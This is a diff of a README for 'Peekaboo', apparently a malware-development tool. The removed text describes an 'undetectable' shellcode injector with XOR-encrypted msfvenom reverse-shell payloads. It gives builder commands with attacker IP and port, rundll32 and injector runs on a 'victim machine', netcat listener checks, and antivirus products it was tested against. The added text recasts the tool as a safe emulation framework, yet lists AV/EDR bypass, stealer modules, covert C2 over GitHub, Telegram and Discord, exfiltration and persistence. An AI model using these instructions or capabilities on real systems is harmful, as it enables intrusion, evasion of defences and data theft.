@@ -1,97 +1,37 @@
 # Peekaboo
 
-Simple undetectable shellcode and code injector launcher example. Inspired by RTO malware development course.
+Peekaboo is a modular framework designed to safely emulate malware behavior. It allows security researchers, red teamers, and blue teamers to reproduce complex threat scenarios - including Command & Control (C2) communication, persistence mechanisms, and lateral movement - without using destructive payloads.     
 
-## Main logic
+**The goal of Peekaboo is to accelerate detection engineering and operator training by providing predictable, reproducible, and safe threat artifacts.**    
 
-XOR encryption and decryption for functions call and main payload - `msfvenom` reverse shell as example.
+## key features (how it works?)
 
-## Usage
-## 1. DLL
-### on attacker machine
+- malware **source code template** - build a payload/stealer from templates (select C2 channel & data collection modules).
+- **payload generator** - automated generation of C/C++ based payloads with built-in obfuscation (API hashing, string encryption).    
+- **AV/EDR bypass** - encryption/encoding (syscalls)        
+- **multi-channel C2** - support for various covert channels:
+    - standard HTTP/S    
+    - GitHub (abusing Issues/Commits)    
+    - Telegram & Discord Webhooks    
+    - TODO: adding all channels from one of [my recent research](https://www.youtube.com/watch?v=l2G2TZvzj0E)     
+- **exfiltration** - staged exfil to controlled endpoints (Github/Discord/Slack/VirusTotal message).      
+- **evasive persistence** - modular implementation of Windows (Linux, MacOS) persistence (LaunchAgents, Registry Run Keys, etc.).    
+- **lightweight dashboard** - a python-based C2 backend and dashboard for real-time monitoring of active "beacons".     
+- **safe by design:** Focuses on telemetry generation (process creation, network connections) rather than actual system damage.      
 
-check your IP:
-```bash
-ip a
-```
+## architecture
 
-![attacker machine IP](./screenshots/2022-04-24_13-05.png?raw=true)
+Peekaboo consists of 5 main components:    
+First **malware** module - highly portable C/C++ code designed to build specific "behaviors" (for final agent binary) on the target system.            
+1. **crypto (malware, agent)** - build-in payload encryption/decryption logic constructor for agents.    
+2. **injection (malware, agent)** - build-in injection logic constructor for agents.      
+3. **persistence (malware, agent)** - build-in persistence logic constructor for agents.     
+4. **stealer (malware, agent)** - stealer logic.      
 
-run python script with flags:
-```bash
-python3 peekaboo.py -l 192.168.56.1 -p 4444 --build 1
-```
+Second, **payloads** module - build-in payloads.     
+5. **payloads** - for simplicity, just messagebox and reverse shell.      
 
-![run python script](./screenshots/2022-04-24_13-08.png?raw=true)
-
-### then on victim machine (windows 10 x64):
-run on powershell or cmd promt:
-```cmd
-rundll32 .\peekaboo.dll, lCiSdbvIAaeZLHFfkUhEcbOy
-```
-
-![run on victim machine](./screenshots/2022-04-24_13-11.png?raw=true)
-
-### check on attacker machine:
-check your netcat listener:
-
-![check netcat listener](./screenshots/2022-04-24_13-12.png?raw=true)
-
-![check IP address](./screenshots/2022-04-24_13-13.png?raw=true)
-
-## 2.Injector
-### on attacker machine:
-check attacker ip:
-```bash
-ip a
-```
-
-![check IP](./screenshots/2022-04-24_13-05.png?raw=true)
-
-run python script on linux (for example process `mspaint.exe`):
-```bash
-python3 peekaboo.py -l 192.168.56.1 -p 4444 -e mspaint.exe --build 2
-```
-
-![run python script](./screenshots/2022-04-24_13-18.png?raw=true)
-
-### then on victim machine run (windows 10 x64):
-```cmd
-.\peekaboo.exe
-```
-
-or click (if `-m windows` param)
-
-![run on victim machine](./screenshots/2022-04-24_13-20.png?raw=true)
-
-### check on attacker machine:
-check your netcat listener:
-
-![check netcat listener](./screenshots/2022-04-24_13-22.png?raw=true)
-
-## 3. NT API injector
-run python script on linux (for example process `mspaint.exe`):
-```bash
-python3 peekaboo.py -l 192.168.56.1 -p 4444 -e mspaint.exe -m console --build 3
-```
-
-![enc and compile nt](./screenshots/2022-04-24_13-25.png?raw=true)
-
-### then on victim machine (windows 10 x64):
-```cmd
-.\peekaboo.exe
-```
-
-![run malware](./screenshots/2022-04-24_13-27.png?raw=true)    
-
-![run malware](./screenshots/2022-04-24_13-29.png?raw=true)
-
-## Issues.
-Tested on:
-1. Attacker machines: Kali linux 2020.1, Windows 10 x64
-2. Victim machine: Windows 7 x64, Windows 10 x64
-3. Payload: windows x64 reverse shell from msfvenom
-4. AV Engines: Kaspersky, Windows Defender, Norton Antivirus Plus
+Final, `peekaboo.py` builder in Python.     
 
 ## virus total result:
 02 september 2021
@@ -121,16 +61,6 @@ Tested on:
 ![websec](./screenshots/websec.png?raw=true)     
 
 [https://websec.net/scanner/result/a3583316-cb72-4894-bd22-48241ca79db9](https://websec.net/scanner/result/a3583316-cb72-4894-bd22-48241ca79db9)     
-
-## TODO
-- [x] Compile injector in Kali linux
-- [x] XOR + AES [aes branch](https://github.com/cocomelonc/peekaboo/tree/aes)
-- [x] Calling Windows API functions by hash names
-- [x] Find Kernel32 base via asm style
-- [x] One python builder
-- [ ] Anti-VM tricks
-- [ ] Persistence via Windows Registry run keys
-- [ ] Replace msfvenom shell to donut payload???
 
 ## Attention
 This tool is a Proof of Concept and is for Educational Purposes Only!!! Author takes no responsibility of any damage you cause
